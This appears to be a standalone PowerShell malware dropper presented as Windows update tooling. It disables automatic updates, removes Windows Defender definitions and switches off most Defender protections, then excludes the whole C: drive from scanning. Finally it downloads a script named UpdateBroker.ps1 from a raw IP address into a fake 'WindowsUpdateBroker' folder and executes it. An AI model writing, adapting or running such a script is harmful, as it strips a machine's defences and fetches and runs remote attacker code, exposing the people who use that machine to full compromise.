
If (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name NoAutoUpdate -ErrorAction SilentlyContinue) {
	echo 'updateAvailable'
	} Else {
	New-Item -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\'
    New-Item -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU'
	Set-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name NoAutoUpdate -Value 1
	}
$ErrorActionPreference = "SilentlyContinue"
<# Defender #>

& 'c:\Program Files\Windows Defender\mpcmdrun.exe' -RemoveDefinitions -All

Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableCatchupFullScan $true
Set-MpPreference -DisableCatchupQuickScan $true
Set-MpPreference -DisableCpuThrottleOnIdleScans $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableRemovableDriveScanning $true
Set-MpPreference -DisableRestorePoint $true
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableDnsOverTcpParsing $true
Set-MpPreference -DisableDnsParsing $true
Set-MpPreference -DisableHttpParsing $true
Set-MpPreference -DisableInboundConnectionFiltering $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableNetworkProtectionPerfTelemetry $true
Set-MpPreference -DisableRdpParsing $true
Set-MpPreference -DisableSshParsing $true
Set-MpPreference -DisableTlsParsing $true
Set-MpPreference -RandomizeScheduleTaskTimes $False
Set-MpPreference -UnknownThreatDefaultAction Allow
Add-MpPreference -ExclusionPath "C:\"
$ErrorActionPreference = "SilentlyContinue"
<# ASMI #>
$brokerpath = Test-path c:\Windows\Temp\WindowsUpdateBroker
if ($brokerpath = 'False') { 
	New-Item -Path "c:\Windows\Temp" -Name "WindowsUpdateBroker" -ItemType "directory"
	$ErrorActionPreference = "SilentlyContinue"
}
$brokerscript = Test-path 'c:\Windows\Temp\WindowsUpdateBroker\UpdateBroker.ps1'
if ($brokerscript = 'True') {
	Remove-Item –path c:\Windows\Temp\WindowsUpdateBroker\UpdateBroker.ps1 –recurse -Force
}
(New-Object Net.WebClient).DownloadFile("http://139.59.231.237:9898/UpdateBroker.ps1","C:\Windows\Temp\WindowsUpdateBroker\UpdateBroker.ps1")
invoke-expression -Command C:\Windows\Temp\WindowsUpdateBroker\UpdateBroker.ps1
